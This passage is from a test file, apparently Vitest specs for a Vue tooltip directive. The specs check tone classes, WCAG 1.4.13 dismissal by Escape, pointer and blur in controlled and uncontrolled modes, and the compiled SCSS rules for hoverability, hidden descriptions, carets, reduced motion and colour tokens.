    expect(chip().classList.contains('nb-tooltip-flavor-danger')).toBe(false)
    both.unmount()
  })

  it('accepts chipClass, and the deprecated classExtra, on the chip only', () => {
    const wrapper = openWith({ body: 'Body', chipClass: 'wide' })
    expect(chip().classList.contains('wide')).toBe(true)
    expect(el(wrapper).classList.contains('wide')).toBe(false)
    wrapper.unmount()

    const legacy = openWith({ body: 'Body', classExtra: 'wide' })
    expect(chip().classList.contains('wide')).toBe(true)
    legacy.unmount()
  })

  it('repaints the tone of a chip that is already open', async () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', status: 'info' } })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chip().classList.contains('nb-tooltip-flavor-info')).toBe(true)

    await wrapper.setProps({ opts: { body: 'Body', status: 'danger' } })
    expect(chip().classList.contains('nb-tooltip-flavor-danger')).toBe(true)
    expect(chip().classList.contains('nb-tooltip-flavor-info')).toBe(false)

    wrapper.unmount()
  })
})

/**
 * Dismissal. WCAG 2.1 AA 1.4.13 asks for a way to make hover or focus content
 * go away without moving the pointer or the focus, and Escape is that way.
 *
 * The interesting half is controlled mode. `open` belongs to the host, so the
 * directive must not close the chip itself; what it owes the host is an
 * honest report, with the reason that says a human asked. An earlier build
 * routed Escape through the same path as a route change ('program'), which
 * skips the controlled gate: the chip vanished, the host was never told, and
 * its very next render put the chip straight back. These specs pin both the
 * reason and the absence of that resurrection.
 */
describe('v-nb-tooltip: dismissal (WCAG 1.4.13)', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  /** Escape, as a keyboard user sends it: at the document, cancelable, so a
   *  test can also check we did not eat it. */
  const escape = () => {
    const event = new KeyboardEvent('keydown', {
      key: 'Escape',
      bubbles: true,
      cancelable: true,
    })
    document.dispatchEvent(event)
    vi.advanceTimersByTime(1)
    return event
  }

  it('reports Escape as a dismissal, not as a program change', () => {
    const seen: Array<[boolean, string]> = []
    const opts = (): ITooltipOptions => ({
      body: 'Body',
      onOpenChange: (open, reason) => seen.push([open, reason]),
    })
    const wrapper = mountAnchor({ opts: opts() })

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)

    escape()

    // Uncontrolled: the directive owns visibility, so it closes AND reports.
    expect(chips().length).toBe(0)
    expect(seen).toEqual([
      [true, 'pointer'],
      [false, 'dismiss'],
    ])

    wrapper.unmount()
  })

  it('does not let an uncontrolled chip come back on the next render', async () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', defaultOpen: true } })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    escape()
    expect(chips().length).toBe(0)

    // A re-render for an unrelated reason (new content) must not re-run the
    // opening that `defaultOpen` did once at mount.
    await wrapper.setProps({ opts: { body: 'Body 2', defaultOpen: true } })
    vi.advanceTimersByTime(SHOW_DELAY + 1)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })

  it('reports Escape to a CONTROLLED host and leaves the chip to it', async () => {
    const seen: Array<[boolean, string]> = []
    const opts = (open: boolean): ITooltipOptions => ({
      body: 'Body',
      open,
      onOpenChange: (o, reason) => seen.push([o, reason]),
    })
    const wrapper = mountAnchor({ opts: opts(true) })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)
    seen.length = 0

    const event = escape()

    // The host owns `open`, so the chip is still standing: closing it here
    // would be the directive writing to state it does not own, and the next
    // render would undo it anyway. What the host gets is the reason it needs
    // to act on.
    expect(seen).toEqual([[false, 'dismiss']])
    expect(chips().length).toBe(1)
    // Still not stolen from the dialog underneath.
    expect(event.defaultPrevented).toBe(false)

    // The render that follows, with `open` still true because the host has
    // not acted yet, must be a no-op: no second chip, no second report.
    await wrapper.setProps({ opts: opts(true) })
    vi.advanceTimersByTime(SHOW_DELAY + 1)
    expect(chips().length).toBe(1)
    expect(seen).toEqual([[false, 'dismiss']])

    // And when the host does act, the chip goes, once, as a program change.
    await wrapper.setProps({ opts: opts(false) })
    vi.advanceTimersByTime(HIDE_ANIMATION + 1)
    expect(chips().length).toBe(0)
    expect(seen).toEqual([
      [false, 'dismiss'],
      [false, 'program'],
    ])

    wrapper.unmount()
  })

  it('gives an outside pointerdown and a window blur the same reason', () => {
    const seen: Array<[boolean, string]> = []
    const opts = (): ITooltipOptions => ({
      body: 'Body',
      onOpenChange: (open, reason) => seen.push([open, reason]),
    })

    const first = mountAnchor({ opts: opts() })
    el(first).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    pointerDown()
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(0)
    expect(seen[seen.length - 1]).toEqual([false, 'dismiss'])
    first.unmount()

    seen.length = 0
    const second = mountAnchor({ opts: opts() })
    el(second).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    window.dispatchEvent(new Event('blur'))
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(0)
    expect(seen[seen.length - 1]).toEqual([false, 'dismiss'])
    second.unmount()
  })

  it('warns when a controlled tooltip has nobody listening', () => {
    // The failure mode this catches: `open` bound to a ref that nothing ever
    // writes back to. Every gesture, Escape included, then reports into the
    // void and the chip is genuinely undismissable, which is the 1.4.13
    // failure the reason plumbing exists to prevent.
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const wrapper = mountAnchor({ opts: { body: 'Body', open: true } })
    vi.advanceTimersByTime(1)

    escape()

    expect(chips().length).toBe(1)
    expect(warn).toHaveBeenCalledTimes(1)
    expect(String(warn.mock.calls[0][0])).toContain('onOpenChange')

    warn.mockRestore()
    wrapper.unmount()
  })

  it('still tears a controlled chip down on the host-driven route change', () => {
    const seen: Array<[boolean, string]> = []
    const wrapper = mountAnchor({
      opts: {
        body: 'Body',
        open: true,
        onOpenChange: (open, reason) => seen.push([open, reason]),
      },
    })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)
    seen.length = 0

    // dismissAllTooltips is the host talking, not the user: the anchor is
    // about to be unmounted by the router, so the chip goes whoever owns it.
    dismissAllTooltips()
    vi.advanceTimersByTime(1)

    expect(chips().length).toBe(0)
    expect(seen).toEqual([[false, 'program']])

    wrapper.unmount()
  })
})

/**
 * The stylesheet contract, checked against the CSS the build actually emits.
 *
 * Everything above this line runs in jsdom, which has no layout engine and no
 * cascade: it will happily report an element as visible when the stylesheet
 * says `display: none`, and it never applies a stylesheet we did not hand it.
 * So the claims that live in CSS rather than in the directive (the chip is
 * reachable by the pointer, the description node is hidden without leaving the
 * accessibility tree, the caret is drawn where the directive aims it, a user
 * who asked for less motion gets none) were until now asserted nowhere at all.
 *
 * This compiles the real SCSS with the real compiler and reads the real
 * declarations. It is not a substitute for a browser, and it is not pretending
 * to be one: it cannot tell you the caret lands on the anchor. It can tell you
 * that the rules the docs promise are in the file and survive compilation,
 * which is the half of the gap that can be closed from here.
 */
describe('v-nb-tooltip: the compiled stylesheet', () => {
  let css = ''

  beforeAll(async () => {
    const sass = await import('sass-embedded')
    css = sass.compileString(
      '@use "src/styles/directives/tooltip" as t; @include t.tooltip;',
      { loadPaths: ['.'], style: 'expanded' },
    ).css
  })

  /** The declarations of one top-level rule, as text. */
  const block = (selector: string) => {
    const at = css.indexOf(`${selector} {`)
    expect(at, `no rule for ${selector}`).toBeGreaterThan(-1)
    return css.slice(at, css.indexOf('}', at))
  }

  it('lets the pointer reach the chip (WCAG 1.4.13 Hoverable)', () => {
    // `pointer-events: none` would make the hoverable half of 1.4.13
    // impossible by construction, and would make a clamped chip unreadable to
    // anyone at 200% zoom who has to pan onto it.
    expect(block('.nb-tooltip')).toContain('pointer-events: auto')
    expect(block('.nb-tooltip')).not.toContain('pointer-events: none')
  })

  it('hides the description node visually without hiding it from AT', () => {
    const rule = block('.nb-tooltip-description')
    expect(rule).toContain('clip-path: inset(50%)')
    expect(rule).toContain('inline-size: 1px')
    // Either of these would take the node out of the accessibility tree,
    // which is the only place it exists to be.
    expect(rule).not.toContain('display: none')
    expect(rule).not.toContain('visibility: hidden')
  })

  it('draws a caret on all four sides, aimed by the directive own variable', () => {
    // The directive writes `--nb-tooltip-arrow-offset` after clamping the
    // chip to the viewport. If the stylesheet stopped reading it, a clamped
    // chip would keep a centred caret pointing at nothing.
    for (const side of ['top', 'bottom', 'left', 'right']) {
      const fill = block(`.nb-tooltip-${side}:before`)
      expect(fill).toContain('--nb-tooltip-arrow-offset, 50%')
      expect(fill).toContain('var(--tooltip-arrow-border-color)')
    }
    // The fill sits above the outline, and the outline is drawn one pixel
    // larger, so the contour shows as a border around the triangle rather
    // than covering it.
    expect(css).toMatch(/\.nb-tooltip:before \{\s*z-index: 2;\s*\}/)
    expect(css).toMatch(
      /\.nb-tooltip:after \{\s*z-index: 1;\s*border-width: calc\(var\(--nb-base-unit\) \+ 1px\);\s*\}/,
    )
  })

  it('stops animating for a user who asked for less motion', () => {
    const at = css.indexOf('@media (prefers-reduced-motion: reduce)')
    expect(at).toBeGreaterThan(-1)
    expect(css.slice(at, at + 200)).toContain('animation: none !important')
  })

  it('carries a foreground token for every status, never a literal colour', () => {
    // A hardcoded white is right in at most one theme and is the worst
    // available choice in the other, which is why every flavour foreground is
    // the auto-contrast companion of its own background.
    for (const status of ['primary', 'info', 'success', 'warning', 'danger']) {
      const rule = block(`.nb-tooltip-flavor-${status}`)
      expect(rule).toContain(`background: var(--nb-c-${status})`)
      expect(rule).toContain(`color: var(--nb-c-${status}-a11y)`)
    }
    expect(css).not.toMatch(/#[0-9a-fA-F]{3,8}\b/)
  })

  it('sizes and pads the chip with logical properties', () => {
    // So a right-to-left build gets its padding and its measure on the sides
    // the text actually runs along.
    const rule = block('.nb-tooltip')
    expect(rule).toContain('max-inline-size: var(--nb-tooltip-max-width')
    expect(rule).toContain('padding-inline: var(--nb-base-unit)')
    expect(rule).toContain('text-align: start')
  })
})
